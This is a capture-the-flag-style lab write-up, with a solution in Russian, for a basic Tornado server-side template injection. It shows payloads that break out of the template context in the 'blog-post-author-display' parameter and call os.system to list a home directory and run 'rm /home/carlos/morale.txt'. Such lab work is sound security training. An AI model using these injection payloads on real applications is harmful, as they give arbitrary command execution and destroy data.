# Basic server-side template injection (code context)
PRACTITIONER

This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

## Решение
При изменении значения "Preferred name" на сервер отправляется запрос со следующими параметрами:

`blog-post-author-display=user.nickname&csrf=K1WPqSseoe7wpE5pQPvme4SxA1WYvfMn`

Судя по строке "user.nickname" в качестве значения параметра `blog-post-author-display` можно предположить, что это значение подставляется в шаблон. Попробую передать туда выражение 7*7:

`blog-post-author-display=7*7&csrf=K1WPqSseoe7wpE5pQPvme4SxA1WYvfMn`

В результате в отправленных комментариях имя пользователя меняется на 49:
```
49 | 07 April 2024

test
```
Попробую выйти из контекста, закрыв двойные фигурные скобки и передав произвольную строку после:

`blog-post-author-display=user.nickname}}hello&csrf=K1WPqSseoe7wpE5pQPvme4SxA1WYvfMn`
```
H0td0ghello}} | 07 April 2024

test
```
Сработало.

Попробую импортировать модуль `os`, чтобы вызвать функцию `os.system` для выполнения произвольной команды:

`blog-post-author-display=user.nickname}}{% import os %}{{os.system('ls /home/carlos')}}{{user.nickname&csrf=K1WPqSseoe7wpE5pQPvme4SxA1WYvfMn`

Перезагрузка страницы выводить возле комментария имя файла: `morale.txt`. Передам в качестве никнейма вызов команды на удаление этого файла:

`blog-post-author-display=user.nickname}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}{{user.nickname&csrf=K1WPqSseoe7wpE5pQPvme4SxA1WYvfMn`

Перезагружаю страницу.Задание выполнено.
